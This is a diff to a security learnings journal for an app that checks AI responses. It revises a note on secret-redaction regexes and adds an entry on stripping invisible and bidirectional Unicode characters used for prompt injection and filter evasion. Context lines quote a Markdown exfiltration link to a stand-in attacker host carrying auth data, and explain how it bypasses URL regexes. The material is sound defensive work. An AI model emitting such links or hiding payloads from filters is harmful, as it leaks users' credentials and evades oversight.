@@ -83,7 +83,7 @@ Broad regex patterns intended to catch secrets can lead to significant functiona
 A generic 40-character alphanumeric regex (`\b[A-Za-z0-9/+=]{40}\b`) intended to catch AWS Secret Access Keys will trigger high false-positives against Git commit hashes, SHA-1 checksums, and other common 40-character blobs ubiquitous in development environments. Redaction must favor high-precision patterns with unique prefixes (like `github_pat_` or `sk_live_`) or use proximity-based heuristics to ensure data integrity is maintained for non-sensitive technical identifiers.
 
 **Prevention:**
-Always validate new redaction patterns against common non-sensitive identifiers (Git hashes, UUIDs, Base64 padding). Avoid length-only detection for secrets without a known, constant prefix.
+Always validate new redaction patterns against common non-sensitive technical identifiers (Git hashes, UUIDs, Base64 padding). Avoid length-only detection for secrets without a known, constant prefix.
 
 ## 2025-05-18 - Storage-Level Prototype Pollution Defense
 
@@ -251,3 +251,13 @@ Always include all variations of data-consuming methods (`json`, `text`, `blob`,
 **Vulnerability:** Regular expression checks on AI responses for data exfiltration (`urlRegex`) frequently use lookaheads or word boundaries like `(?:\s|^)\/\/` to detect protocol-relative URLs (`//attacker.com`). This fails when links are enclosed in brackets or parentheses (e.g. `[leak](//attacker.com?auth=...)`), because character boundaries like `(` are neither spaces nor the start of a string. Furthermore, constructing a `URL` object from such strings fails, forcing a fallback to basic catch-blocks which might not perform high-entropy or query parameter keyword validation.
 **Learning:** Traditional boundary-based URL extraction is bypassable via common Markdown structures. Using a negative lookbehind assertion `(?<!:)\/\/` identifies protocol-relative URLs anywhere in the string. Prepending `https:` to protocol-relative matches and passing the application origin as a base to the `URL` constructor prevents parsing failures.
 **Prevention:** Always use regex lookbehind assertions instead of space boundaries for protocol-relative links. Ensure the URL parser has a robust fallback check that mirrors the deep entropy and keyword analysis of the happy path.
+
+## 2026-06-14 - Steganographic and Invisible Payload Neutralization
+**Vulnerability:**
+Malicious inputs or AI responses can utilize invisible, zero-width, or bidirectional unicode formatting characters (e.g., LTR/RTL marks, directional overrides, word joiners, Hangul fillers) to smuggle credentials, bypass keyword-based exfiltration filters, or execute Trojan Source / prompt injection attacks while remaining visually hidden from human users.
+
+**Learning:**
+Keyword filters and entropy checks typically operate on plain text but can be bypassed if the payload is sharded or interleaved with non-printing characters. Expanding the RASP boundaries to strip these invisible characters in both `sanitizeInput` (at the ingress) and `validateAIResponse` (at the egress) prevents hidden payloads from bypassing security mechanisms or executing hidden commands in downstream models.
+
+**Prevention:**
+Always sanitize user-provided string inputs and validate external AI outputs against a comprehensive set of invisible, bidirectional, and formatting unicode characters (`[\u200B-\u200F\u202A-\u202E\u2060-\u206F\uFEFF\u115F\u1160\u3164\uFFA0]`). Ensure these checks are enforced at both validation choke-points to maintain robust defense in depth.
